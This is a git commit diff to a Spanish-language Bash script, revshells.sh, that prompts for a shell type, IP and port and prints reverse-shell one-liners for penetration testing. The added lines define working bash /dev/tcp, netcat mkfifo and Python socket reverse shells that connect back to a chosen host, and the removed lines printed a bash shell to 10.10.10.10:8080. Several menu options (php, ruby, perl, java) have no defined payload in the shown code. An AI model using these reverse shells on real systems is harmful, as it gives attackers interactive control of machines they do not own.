8360808f419f81c27b97edf629e7ace3c920a9d1
Erik451 <47476901+erik-451@users.noreply.github.com>
2021-04-02 09:35:20 -0400

    Update reverseshells.sh
    Add more options

--- revshells.sh
+++ revshells.sh
@@ -9,38 +9,65 @@ purpleColour="\e[0;35m\033[1m"
 turquoiseColour="\e[0;36m\033[1m"
 grayColour="\e[0;37m\033[1m"
 
-echo 
+#Funcion ctrl + c
+trap ctrl_c INT
+function ctrl_c(){
+    echo -e "\n${yellowColour}[]${endColour}${grayColour}Saliendo${endColour}"
+    exit 0
+}
+
+#Banner
+echo -e "${redColour}    ____                                   _____ __         ____"
+        sleep 0.05
+        echo -e "   / __ \___ _   _____  _____________     / ___// /_  ___  / / /____"
+        sleep 0.05
+        echo -e "  / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / / ___/"
+        sleep 0.05
+        echo -e " / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / (__  ) "
+        sleep 0.05
+        echo -e "/_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/____/  ${endColour}"
+        echo -e "\n ${yellowColour} By Erik451 ${endColour}"
+
+#Tipos de shell
+echo -e "\n ${purpleColour} Tipos de shell disponibles: ${endColour}"
+
+echo -e "\n 1) bash     5) ruby"
+echo -e "\n 2) netcat   6) perl"
+echo -e "\n 3) php      7) java"
+echo -e "\n 4) python"
+
 #Pregunta por el tipo de shell
-echo -e "${purpleColour}[${yellowColour}*${purpleColour}]${turquoiseColour} Introduce el tipo de shell: ${endColour}"; read shell;
+echo -e "\n${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Introduce el tipo de shell: ${endColour}"; read shell
+echo -e "${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Introduce tu ip: ${endColour}"; read ip
+echo -e "${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Introduce el puerto: ${endColour}"; read port
 
-#Reverse Shell Bash
-if [ "$shell" == "bash"]
+#VARIABLES
+bash="bash -i >& /dev/tcp/$ip/$port 0>&1"
+netcat="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
+python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
+#Respuerta tipo de shell
+case $shell in
 
-then
+    1)
+        echo -e "${blueColour}Use this:${endColour}${yellowColour} $bash"
+         ;;
+    2)
+        echo -e "${blueColour}Use this:${endColour}${yellowColour} $netcat"
+         ;;
+    3)
+        echo -e "${blueColour}Use this:${endColour}${yellowColour} $php"
+         ;;
+    4)
+        echo -e "${blueColour}Use this:${endColour}${yellowColour} $python"
+         ;;
+    5)
+        echo -e "${blueColour}Use this:${endColour}${yellowColour} $ruby"
+         ;;
+    6)
+        echo -e "${blueColour}Use this:${endColour}${yellowColour} $perl"
+         ;;
+    7)
+        echo -e "${blueColour}Use this:${endColour}${yellowColour} $java"
+         ;;
 
-  echo -e "${redColour}    ____                                   _____ __         ____   ____             __"
-  sleep 0.05
-  echo -e "   / __ \___ _   _____  _____________     / ___// /_  ___  / / /  / __ )____ ______/ /_"
-  sleep 0.05
-  echo -e "  / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / /  / __  / __ / ___/ __ \"
-  sleep 0.05
-  echo -e " / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / /  / /_/ / /_/ (__  ) / / /"
-  sleep 0.05
-  echo -e "/_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/  /_____/\__,_/____/_/ /_/${endColour}"
-                                                                                        
-  echo -e "Use this: ${yellowColour} bash -i >& /dev/tcp/10.10.10.10/8080 0>&1 ${endColour}"
-
-#Reverse Shell Netcat
-elif [ "$shell" == "netcat"]
-
-then
-
-  echo -e "${redColour}    ____                                   _____ __         ____   ____             __"
-  sleep 0.05
-  echo -e "   / __ \___ _   _____  _____________     / ___// /_  ___  / / /  / | / /__  / /__________ _/ /"
-  sleep 0.05
-  echo -e "  / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / /  / __  / __ / ___/ __ \"
-  sleep 0.05
-  echo -e " / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / /  / /|  /  __/ /_/ /__/ /_/ / /"
-  sleep 0.05
-  echo -e "/_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/  /_/ |_/\___/\__/\___/\__,_/\__/${endColour}"
+esac
